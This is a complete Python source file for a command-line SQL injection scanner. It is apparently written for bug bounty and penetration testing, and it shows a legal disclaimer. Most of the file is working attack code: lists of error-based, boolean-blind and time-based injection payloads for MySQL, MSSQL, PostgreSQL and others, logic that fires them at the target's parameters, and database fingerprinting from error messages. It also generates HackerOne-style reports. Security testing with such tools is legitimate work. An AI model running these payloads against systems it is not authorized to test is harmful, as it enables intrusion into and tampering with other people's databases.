#!/usr/bin/env python3
# sqli scanner - for authorized bug bounty / pentest use only
# author: Itai

import argparse
import sys
import time
import re
import json
import os
import urllib.parse
import shutil
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

try:
    import requests
    from requests.exceptions import RequestException, Timeout, ConnectionError as ReqConnectionError
except ImportError:
    print("[!] requests not installed. run: pip install requests")
    sys.exit(1)




class C:
    RST = "\033[0m"; B = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YLW = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
    WHT = "\033[97m"; BG_RED = "\033[41m"

    @classmethod
    def off(cls):
        for attr in ['RST','B','DIM','RED','GRN','YLW','BLU','MAG','CYN','WHT','BG_RED']:
            setattr(cls, attr, '')

W = min(shutil.get_terminal_size().columns, 80)

def _vlen(s: str) -> int:
    return len(re.sub(r'\033\[[0-9;]*m', '', s))

def cprint(msg="", **kw):
    print(msg, flush=True, **kw)

def draw_box(title, lines, color=None):
    color = color or C.CYN
    inner = W - 4
    cprint(f"{color}┌{'─'*(W-2)}┐{C.RST}")
    if title:
        cprint(f"{color}│{C.RST} {C.B}{title}{C.RST}{' '*(inner - _vlen(title))}{color} │{C.RST}")
        cprint(f"{color}├{'─'*(W-2)}┤{C.RST}")
    for ln in lines:
        pad = inner - _vlen(ln)
        cprint(f"{color}│{C.RST} {ln}{' '*max(pad,0)}{color} │{C.RST}")
    cprint(f"{color}└{'─'*(W-2)}┘{C.RST}")

def draw_sep():
    cprint(f"{C.DIM}{'━'*W}{C.RST}")

def draw_table(hdrs, rows, widths):
    sep = f"{C.DIM}{'┼'.join('─'*w for w in widths)}{C.RST}"
    top = f"{C.DIM}{'┬'.join('─'*w for w in widths)}{C.RST}"
    bot = f"{C.DIM}{'┴'.join('─'*w for w in widths)}{C.RST}"
    def fmtrow(cells):
        return f"{C.DIM}│{C.RST}".join(
            f" {c}{' '*max(w - _vlen(c) - 1, 0)}" for c, w in zip(cells, widths))
    cprint(top)
    cprint(fmtrow([f"{C.B}{h}{C.RST}" for h in hdrs]))
    cprint(sep)
    for r in rows:
        cprint(fmtrow(r))
    cprint(bot)

def pbar(cur, tot, desc="", width=30):
    pct = cur/tot if tot else 0
    filled = int(width * pct)
    bar = f"{C.CYN}{'█'*filled}{'░'*(width-filled)}{C.RST}"
    sys.stdout.write(f"\r  {bar} {pct:>5.0%}  {C.DIM}{desc}{C.RST}    ")
    sys.stdout.flush()
    if cur >= tot:
        sys.stdout.write("\n")


VERSION = "1.0.0"
BANNER = f"""
{C.CYN}{C.B}
  ___  ___  _    _   ___
 / __|/ _ \\| |  (_) / __| __ __ _ _ _  _ _  ___ _ _. _ _
 \\__ \\ (_) | |_ | | \\__ \\/ _/ _` | ' \\| ' \\/ -_) _'_|
 |___/\\__\\___|_|_| |___/\\__\\__,_|_||_|_||_\\___|_|
{C.RST}
{C.DIM}{'━'*53}{C.RST}
{C.B}{C.WHT}  SQLi Scanner v{VERSION} — SQL Injection Scanner{C.RST}
{C.DIM}  For authorized bug bounty testing only{C.RST}
{C.DIM}{'━'*53}{C.RST}
"""


class Severity(Enum):
    CRITICAL = "CRITICAL"; HIGH = "HIGH"; MEDIUM = "MEDIUM"
    LOW = "LOW"; INFO = "INFO"

class InjType(Enum):
    ERROR = "Error-Based"; BOOL_BLIND = "Boolean-Based Blind"; TIME_BLIND = "Time-Based Blind"

@dataclass
class Finding:
    url: str; parameter: str; inj_type: InjType; severity: Severity
    payload: str; evidence: str; confidence: int; dbms: str = "Unknown"
    notes: str = ""; ts: str = field(default_factory=lambda: datetime.now().isoformat())

    def sev_color(self):
        m = {Severity.CRITICAL: f"{C.BG_RED}{C.WHT}{C.B}", Severity.HIGH: f"{C.RED}{C.B}",
             Severity.MEDIUM: C.YLW, Severity.LOW: C.BLU, Severity.INFO: C.DIM}
        return f"{m.get(self.severity,'')}{self.severity.value}{C.RST}"


ERROR_PAYLOADS = [
    ("'", "Single quote"), ('"', "Double quote"), ("'--", "Quote+comment"),
    ("' OR '1'='1", "OR tautology"), ("' OR '1'='1'--", "OR tautology+comment"),
    ("1' ORDER BY 1--", "ORDER BY 1"), ("1' ORDER BY 100--", "ORDER BY 100"),
    ("' UNION SELECT NULL--", "UNION NULL"),
    ("1 AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL version cast"),
    ("' AND extractvalue(1,concat(0x7e,version()))--", "MySQL extractvalue"),
    ("' AND 1=cast(version() as int)--", "PostgreSQL version cast"),
]

BOOLEAN_PAYLOADS = [
    ("' OR 1=1--", "' OR 1=2--", "OR boolean"), ("' OR 'a'='a'--", "' OR 'a'='b'--", "String cmp"),
    ("1 OR 1=1", "1 OR 1=2", "Numeric OR"), ("1' AND 1=1--", "1' AND 1=2--", "AND boolean"),
    ("1) OR (1=1", "1) OR (1=2", "Parenthesized"), ("1' AND 'a'='a", "1' AND 'a'='b", "String AND"),
]

TIME_PAYLOADS = [
    ("' OR SLEEP({d})--", "MySQL"), ("'; WAITFOR DELAY '0:0:{d}'--", "MSSQL"),
    ("' OR pg_sleep({d})--", "PostgreSQL"),
    ("' AND (SELECT {d} FROM (SELECT SLEEP({d}))a)--", "MySQL (sub)"),
]

DBMS_SIGS = {
    "MySQL": [r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
              r"check the manual that corresponds to your MySQL", r"SQLSTATE\[HY000\]"],
    "PostgreSQL": [r"PostgreSQL.*?ERROR", r"Warning.*?\bpg_", r"Npgsql\.", r"PG::SyntaxError",
                   r"ERROR:\s+syntax error at or near"],
    "MSSQL": [r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
              r"Microsoft SQL Native Client error", r"Unclosed quotation mark"],
    "Oracle": [r"\bORA-\d{5}", r"Oracle error", r"Oracle.*?Driver"],
    "SQLite": [r"SQLite\.Exception", r"Warning.*?sqlite_", r"\[SQLITE_ERROR\]", r"unrecognized token:"],
}

GENERIC_SQL_ERRORS = [
    r"sql syntax", r"syntax error", r"unterminated.*?string",
    r"quoted string not properly terminated", r"unexpected end of SQL",
]


class SQLiScanner:
    def __init__(self, url, params=None, method="GET", headers=None,
                 cookies=None, timeout=10, delay=5, threads=5,
                 verbose=False, proxy=None):
        self.url = url
        parsed = urllib.parse.urlparse(url)
        self.base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.params = params or dict(urllib.parse.parse_qsl(parsed.query))
        self.method = method.upper()
        self.headers = headers or {"User-Agent": "Mozilla/5.0 (compatible; scanner)"}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.delay = delay
        self.threads = threads
        self.verbose = verbose
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.sess = requests.Session()
        self.sess.headers.update(self.headers)
        if self.cookies:
            self.sess.cookies.update(self.cookies)
        self.findings: list[Finding] = []
        self.bl_resp = None
        self.bl_len = 0.0
        self.bl_time = 0.0
        self.started = None
        self.reqs = 0

    def _req(self, params=None, data=None) -> Optional[requests.Response]:
        self.reqs += 1
        try:
            if self.method == "GET":
                return self.sess.get(self.base_url, params=params or self.params,
                                     timeout=self.timeout, proxies=self.proxy, verify=True)
            return self.sess.post(self.base_url, data=data or params or self.params,
                                  timeout=self.timeout, proxies=self.proxy, verify=True)
        except Timeout:
            return None
        except (ReqConnectionError, RequestException) as e:
            if self.verbose:
                cprint(f"    {C.DIM}{C.RED}Err: {e}{C.RST}")
            return None

    def _dbms(self, text):
        for db, pats in DBMS_SIGS.items():
            for p in pats:
                if re.search(p, text, re.I):
                    return db
        return "Unknown"

    def _sim(self, a, b):
        if not a or not b: return 0.0
        la, lb = len(a), len(b)
        if la == 0 and lb == 0: return 1.0
        lsim = 1.0 - abs(la-lb)/max(la,lb)
        wa, wb = set(a.lower().split()[:500]), set(b.lower().split()[:500])
        if not wa or not wb: return lsim
        return lsim*0.4 + (len(wa&wb)/max(len(wa|wb),1))*0.6

    def _snippet(self, text, pattern):
        m = re.search(pattern, text, re.I)
        if not m: return ""
        s, e = max(0, m.start()-30), min(len(text), m.end()+30)
        return text[s:e].strip()

    def _baseline(self):
        cprint(f"  {C.DIM}Establishing baseline...{C.RST}")
        ts, ls = [], []
        for _ in range(3):
            t0 = time.time()
            r = self._req()
            dt = time.time() - t0
            if r:
                ts.append(dt); ls.append(len(r.text)); self.bl_resp = r
        if ts:
            self.bl_time = sum(ts)/len(ts)
            self.bl_len = sum(ls)/len(ls)

    def _test_error(self, param):
        findings = []
        for payload, desc in ERROR_PAYLOADS:
            p = {**self.params, param: payload}
            r = self._req(params=p if self.method=="GET" else None,
                          data=p if self.method=="POST" else None)
            if r is None: continue
            body = r.text
            db = self._dbms(body)

            if db != "Unknown":
                snip = ""
                for _, pats in DBMS_SIGS.items():
                    for pat in pats:
                        snip = self._snippet(body, pat)
                        if snip: break
                    if snip: break
                findings.append(Finding(
                    self.url, param, InjType.ERROR, Severity.HIGH, payload,
                    f"DBMS error ({db}): ...{snip[:80]}...", 90, db, desc))
                if self.verbose:
                    cprint(f"    {C.RED}{C.B}✓{C.RST} {desc} → {db}")
                return findings

            for pat in GENERIC_SQL_ERRORS:
                snip = self._snippet(body, pat)
                if snip:
                    findings.append(Finding(
                        self.url, param, InjType.ERROR, Severity.MEDIUM, payload,
                        f"SQL error: ...{snip[:80]}...", 70, "Unknown", desc))
                    if self.verbose:
                        cprint(f"    {C.YLW}✓{C.RST} Generic error: {desc}")
                    return findings
        return findings

    def _test_bool(self, param):
        for tp, fp, desc in BOOLEAN_PAYLOADS:
            pt = {**self.params, param: tp}
            pf = {**self.params, param: fp}
            rt = self._req(params=pt if self.method=="GET" else None,
                           data=pt if self.method=="POST" else None)
            rf = self._req(params=pf if self.method=="GET" else None,
                           data=pf if self.method=="POST" else None)
            if rt is None or rf is None: continue

            lt, lf = len(rt.text), len(rf.text)
            sim = self._sim(rt.text, rf.text)
            sdiff = rt.status_code != rf.status_code
            ldiff = abs(lt - lf)
            sig_ldiff = ldiff > max(self.bl_len * 0.1, 50)
            low_sim = sim < 0.85

            if sdiff or (sig_ldiff and low_sim):
                conf = (50 if sdiff else 0) + (25 if sig_ldiff else 0) + (25 if low_sim else 0)
                conf = min(conf, 95)
                if self.bl_resp:
                    st = self._sim(self.bl_resp.text, rt.text)
                    sf = self._sim(self.bl_resp.text, rf.text)
                    if st > sf + 0.1: conf = min(conf+10, 95)

                ev = []
                if sdiff: ev.append(f"Status: T={rt.status_code} F={rf.status_code}")
                ev.append(f"Len: T={lt} F={lf} (Δ{ldiff})")
                ev.append(f"Sim: {sim:.1%}")

                if self.verbose:
                    cprint(f"    {C.YLW}✓{C.RST} Boolean: {desc} ({conf}%)")
                return [Finding(
                    self.url, param, InjType.BOOL_BLIND,
                    Severity.HIGH if conf >= 75 else Severity.MEDIUM,
                    f"TRUE: {tp}  |  FALSE: {fp}", " | ".join(ev), conf, notes=desc)]
        return []

    def _test_time(self, param):
        for tmpl, db in TIME_PAYLOADS:
            payload = tmpl.format(d=self.delay)
            p = {**self.params, param: payload}

            t0 = time.time()
            r = self._req(params=p if self.method=="GET" else None,
                          data=p if self.method=="POST" else None)
            dt1 = time.time() - t0
            exp = self.bl_time + self.delay - 1

            if dt1 >= exp or (r is None and dt1 >= self.timeout):
                t0 = time.time()
                self._req(params=p if self.method=="GET" else None,
                          data=p if self.method=="POST" else None)
                dt2 = time.time() - t0

                if dt2 >= exp or (r is None and dt2 >= self.timeout):
                    conf = 85 if dt2 >= exp else 65
                    if self.verbose:
                        cprint(f"    {C.RED}{C.B}✓{C.RST} Time: {db} ({dt1:.1f}s, {conf}%)")
                    return [Finding(
                        self.url, param, InjType.TIME_BLIND,
                        Severity.HIGH if conf >= 80 else Severity.MEDIUM, payload,
                        f"Delay: {dt1:.2f}s / {dt2:.2f}s vs baseline {self.bl_time:.2f}s",
                        conf, db.split()[0], f"Suspected {db}")]
        return []

    def scan(self):
        self.started = datetime.now()
        self.findings = []
        cprint(BANNER)

        draw_box("Scan Configuration", [
            f"{C.B}Target{C.RST}     {self.url}",
            f"{C.B}Method{C.RST}     {self.method}",
            f"{C.B}Timeout{C.RST}    {self.timeout}s",
            f"{C.B}Delay{C.RST}      {self.delay}s",
        ] + ([f"{C.B}Proxy{C.RST}      {list(self.proxy.values())[0]}"] if self.proxy else []))

        params = list(self.params.keys())
        if not params:
            cprint(f"\n  {C.YLW}⚠  No parameters found in URL.{C.RST}")
            cprint(f"  {C.DIM}Example: https://example.com/page?id=1&q=test{C.RST}")
            return []

        cprint(f"\n  {C.B}Parameters:{C.RST} {', '.join(params)}")
        self._baseline()
        if not self.bl_resp:
            cprint(f"\n  {C.RED}{C.B}✗ Cannot reach target.{C.RST}")
            return []
        cprint(f"  {C.GRN}✓{C.RST} Baseline: {self.bl_len:.0f} bytes, {self.bl_time:.2f}s\n")

        tests = [("Error-based", self._test_error),
                 ("Boolean-blind", self._test_bool),
                 ("Time-blind", self._test_time)]
        total = len(params) * len(tests)
        step = 0
        for param in params:
            for name, fn in tests:
                step += 1
                pbar(step, total, f"{name}: {param}")
                self.findings.extend(fn(param))

        cprint()
        self._show_results()
        return self.findings

    def _show_results(self):
        elapsed = (datetime.now() - self.started).total_seconds()
        draw_sep()
        cprint(f"{C.B} Scan Complete{C.RST}")
        draw_sep()
        cprint(f"\n  Duration   {elapsed:.1f}s")
        cprint(f"  Requests   {self.reqs}")
        cprint(f"  Findings   {len(self.findings)}\n")

        if not self.findings:
            draw_box("Results", [
                f"{C.GRN}No SQL injection vulnerabilities detected.{C.RST}", "",
                f"{C.DIM}This doesn't guarantee security. Consider testing{C.RST}",
                f"{C.DIM}more params, POST method, or adding auth headers.{C.RST}",
            ], color=C.GRN)
            return

        draw_table(
            ["#", "Severity", "Type", "Param", "DBMS", "Conf"],
            [[str(i+1), f.sev_color(), f.inj_type.value, f.parameter, f.dbms, f"{f.confidence}%"]
             for i, f in enumerate(self.findings)],
            [4, 12, 22, 12, 12, 7])
        cprint()

        for i, f in enumerate(self.findings):
            sc = {Severity.CRITICAL: C.RED, Severity.HIGH: C.RED,
                  Severity.MEDIUM: C.YLW}.get(f.severity, C.DIM)
            draw_box(f"Finding #{i+1} — {f.severity.value}", [
                f"{C.CYN}URL{C.RST}         {f.url}",
                f"{C.CYN}Parameter{C.RST}   {f.parameter}",
                f"{C.CYN}Type{C.RST}        {f.inj_type.value}",
                f"{C.CYN}Payload{C.RST}     {f.payload[:60]}",
                f"{C.CYN}Evidence{C.RST}    {f.evidence[:60]}",
                f"{C.CYN}DBMS{C.RST}        {f.dbms}",
                f"{C.CYN}Confidence{C.RST}  {f.confidence}%",
            ] + ([f"{C.CYN}Notes{C.RST}       {f.notes}"] if f.notes else []), color=sc)
            cprint()

    def save_json(self, path):
        report = {
            "tool": "sqli-scanner", "version": VERSION,
            "scan_date": self.started.isoformat() if self.started else datetime.now().isoformat(),
            "target": self.url, "method": self.method,
            "total_findings": len(self.findings), "total_requests": self.reqs,
            "findings": [{
                "parameter": f.parameter, "type": f.inj_type.value,
                "severity": f.severity.value, "confidence": f.confidence,
                "dbms": f.dbms, "payload": f.payload,
                "evidence": f.evidence, "notes": f.notes, "timestamp": f.ts,
            } for f in self.findings],
        }
        with open(path, "w") as fp:
            json.dump(report, fp, indent=2)
        cprint(f"\n  {C.GRN}✓{C.RST} JSON report: {C.B}{path}{C.RST}")

    def save_hackerone(self, path="hackerone_report.md"):
        if not self.findings: return
        lines = ["## Summary", f"SQL injection vulnerability in `{self.url}`\n"]
        for i, f in enumerate(self.findings, 1):
            lines += [
                f"## Finding #{i}: {f.inj_type.value} SQL Injection",
                f"**Severity:** {f.severity.value}",
                f"**Confidence:** {f.confidence}%",
                f"**Parameter:** `{f.parameter}`",
                *([ f"**DBMS:** {f.dbms}"] if f.dbms != "Unknown" else []),
                "", "### Steps to Reproduce",
                f"1. Navigate to `{self.base_url}`",
                f"2. Inject into `{f.parameter}`:", f"   ```\n   {f.payload}\n   ```",
                f"3. Observe:", f"   ```\n   {f.evidence}\n   ```",
                "", "### Impact",
                "Attacker could extract, modify, or delete database data. "
                "May lead to unauthorized access, auth bypass, or RCE.",
                "", "### Remediation",
                "- Use parameterized queries / prepared statements",
                "- Validate and sanitize input",
                "- Apply least privilege to DB accounts",
                "- Enable WAF SQLi rules", "\n---\n",
            ]
        with open(path, "w") as fp:
            fp.write("\n".join(lines))
        cprint(f"  {C.GRN}✓{C.RST} HackerOne report: {C.B}{path}{C.RST}")


def main():
    p = argparse.ArgumentParser(
        prog="sqli-scanner",
        description="sqli scanner - SQL injection tester for authorized use",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  %(prog)s -u "https://example.com/page?id=1"
  %(prog)s -u "https://example.com/page?id=1" -v --report report.json
  %(prog)s -u "https://example.com/login" -m POST -d "user=admin&pass=test"
  %(prog)s -u "https://example.com/page?id=1" --hackerone --report findings.json
  %(prog)s -u "https://example.com/page?id=1" --proxy http://127.0.0.1:8080
        """)
    p.add_argument("-u", "--url", required=True, help="target URL with parameters")
    p.add_argument("-m", "--method", default="GET", choices=["GET","POST"])
    p.add_argument("-d", "--data", help="POST data")
    p.add_argument("-H", "--header", action="append", dest="headers", help="custom header")
    p.add_argument("-c", "--cookie", help="cookies string")
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--delay", type=int, default=5, help="time-blind delay in seconds (default: 5)")
    p.add_argument("--threads", type=int, default=5)
    p.add_argument("--proxy", help="proxy URL")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--report", metavar="FILE", help="save JSON report to file")
    p.add_argument("--hackerone", action="store_true", help="generate HackerOne markdown report")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--version", action="version", version=f"sqli-scanner v{VERSION}")
    args = p.parse_args()

    if args.no_color:
        C.off()

    draw_box("⚠  LEGAL DISCLAIMER", [
        f"{C.YLW}{C.B}For authorized security testing only.{C.RST}",
        "Only test targets you have written permission for.",
        "Unauthorized testing may violate computer fraud laws.",
        "", f"{C.DIM}By proceeding you confirm authorization.{C.RST}",
    ], color=C.YLW)
    cprint()

    hdrs = {}
    if args.headers:
        for h in args.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                hdrs[k.strip()] = v.strip()

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    params = dict(urllib.parse.parse_qsl(args.data)) if args.data else None

    scanner = SQLiScanner(
        args.url, params, args.method, hdrs or None, cookies or None,
        args.timeout, args.delay, args.threads, args.verbose, args.proxy)

    try:
        findings = scanner.scan()
    except KeyboardInterrupt:
        cprint(f"\n{C.YLW}Interrupted.{C.RST}")
        findings = scanner.findings

    if args.report:
        scanner.save_json(args.report)
    if args.hackerone:
        h1 = args.report.replace(".json", "_h1.md") if args.report else "hackerone_report.md"
        scanner.save_hackerone(h1)

    sys.exit(1 if findings else 0)

if __name__ == "__main__":
    main()
